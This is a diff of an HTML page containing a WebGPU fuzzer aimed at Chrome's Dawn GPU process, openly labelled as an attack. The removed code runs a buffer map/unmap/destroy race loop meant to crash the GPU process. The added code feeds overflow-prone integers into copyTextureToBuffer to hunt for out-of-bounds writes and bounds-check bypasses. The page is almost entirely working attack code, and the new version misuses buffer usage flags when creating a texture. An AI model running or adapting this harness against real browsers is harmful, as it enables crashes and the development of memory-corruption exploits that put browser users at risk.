@@ -1,77 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU Shared Memory Fuzzer</title>
-    <style>
-        body { font-family: monospace; background: #1e1e1e; color: #00ff00; }
-        #log { white-space: pre-wrap; }
-    </style>
+    <title>WebGPU Texture Math Fuzzer</title>
+    <style>body { background: #111; color: #0f0; font-family: monospace; }</style>
 </head>
 <body>
-    <h2>WebGPU DOM Fuzzer - Attacking Dawn IPC</h2>
-    <button id="start" style="padding: 10px; font-size: 16px; font-weight: bold; background: #00ff00; color: black; border: none; cursor: pointer;">START ATTACK</button>
-    <div id="log">Waiting to start...</div>
+    <h2>Attacking copyTextureToBuffer Math</h2>
+    <button id="fuzzBtn" style="padding:10px; background:#f00; color:#fff; font-weight:bold;">FUZZ TEXTURE MATH</button>
+    <pre id="log"></pre>
 
     <script>
         const logEl = document.getElementById('log');
-        function log(msg) { logEl.innerText += msg + '\n'; }
+        function log(msg) { logEl.innerText = msg + '\n' + logEl.innerText; }
 
-        async function startFuzzing() {
-            if (!navigator.gpu) {
-                log("WebGPU not supported on this browser! Make sure you are using Chrome.");
-                return;
-            }
+        // Array of "evil" integers designed to cause overflows
+        const poisonValues = [
+            0, 1, 2, 255, 256, 
+            0x7FFFFFFF, 0x80000000, // 32-bit max
+            0xFFFFFFFF, 0xFFFFFFFE, // 32-bit unsigned max
+            0x100000000,            // 32-bit overflow boundary
+            4294967295, 4294967296  // JS Number boundaries
+        ];
 
-            log("Requesting GPU Adapter...");
-            const adapter = await navigator.gpu.requestAdapter();
-            const device = await adapter.requestDevice();
-            log("Device acquired! Starting Shared Memory Race Condition loop...");
-
-            let iteration = 0;
-
-            // This is the infinite attack loop
-            setInterval(() => {
-                iteration++;
-                if (iteration % 100 === 0) log(`[+] Executed ${iteration} iterations...`);
-
-                try {
-                    // 1. Create a buffer. This sends "DeviceCreateBufferCmd" to the C++ Wire Server
-                    const size = 1024 * 1024; // 1MB
-                    const buffer = device.createBuffer({
-                        size: size,
-                        usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC,
-                        mappedAtCreation: true // This forces immediate Shared Memory allocation!
-                    });
-
-                    // 2. Get the memory pointer (This triggers GetSharedMemoryAs in C++)
-                    const arrayBuffer = buffer.getMappedRange();
-                    const view = new Uint8Array(arrayBuffer);
-                    
-                    // 3. Write junk into the IPC Shared Memory
-                    view[0] = 0xFF;
-                    view[1] = 0xAA;
-
-                    // 4. THE EXPLOIT ATTEMPT: Race Condition!
-                    // We instantly unmap and destroy the object, while simultaneously 
-                    // asking the GPU process to do something with it.
-                    
-                    // Asynchronously tell the GPU to unmap
-                    buffer.unmap();
-                    
-                    // Instantly tell the C++ side to destroy the Object ID
-                    buffer.destroy();
-
-                    // If the C++ side hasn't finished unmapping before it processes the destroy,
-                    // or if the Garbage Collector cleans up the JS object while C++ is reading,
-                    // the GPU Process will crash!
-
-                } catch (e) {
-                    // We catch normal JS errors so the loop doesn't stop
-                }
-            }, 0); // Run as fast as the browser allows
+        function getPoison() {
+            return poisonValues[Math.floor(Math.random() * poisonValues.length)];
         }
 
-        document.getElementById('start').addEventListener('click', startFuzzing);
+        async function runFuzzer() {
+            const adapter = await navigator.gpu.requestAdapter();
+            const device = await adapter.requestDevice();
+            log("Device acquired. Starting 3D Texture OOB Fuzzer...");
+
+            const buffer = device.createBuffer({
+                size: 1024 * 1024 * 4, // 4MB valid buffer
+                usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.MAP_READ
+            });
+
+            const texture = device.createTexture({
+                size: { width: 4, height: 4, depthOrArrayLayers: 2 },
+                format: 'rgba8unorm',
+                usage: GPUBufferUsage.COPY_SRC | GPUBufferUsage.RENDER_ATTACHMENT
+            });
+
+            let runs = 0;
+
+            setInterval(() => {
+                runs++;
+                if(runs % 50 === 0) log(`[+] Executed ${runs} copy attempts...`);
+
+                const encoder = device.createCommandEncoder();
+
+                // Generate malicious copy dimensions
+                // We want to trick the engine into thinking the copy is small, 
+                // but the internal math wraps around and writes OOB.
+                const evilBytesPerRow = getPoison();
+                const evilRowsPerImage = getPoison();
+                const evilDepth = getPoison();
+
+                try {
+                    encoder.copyTextureToBuffer(
+                        { texture: texture },
+                        { 
+                            buffer: buffer, 
+                            bytesPerRow: evilBytesPerRow, 
+                            rowsPerImage: evilRowsPerImage 
+                        },
+                        { width: 4, height: 4, depthOrArrayLayers: evilDepth }
+                    );
+
+                    // If we reach here, the C++ bounds check FAILED to catch our bad math!
+                    device.queue.submit([encoder.finish()]);
+                    log(`[!] CRITICAL: Bypassed bounds check with bpr:${evilBytesPerRow}, rpi:${evilRowsPerImage}, depth:${evilDepth}`);
+
+                } catch (e) {
+                    // Normal behavior: WebGPU threw a validation error
+                }
+            }, 5); 
+        }
+
+        document.getElementById('fuzzBtn').addEventListener('click', runFuzzer);
     </script>
 </body>
 </html>
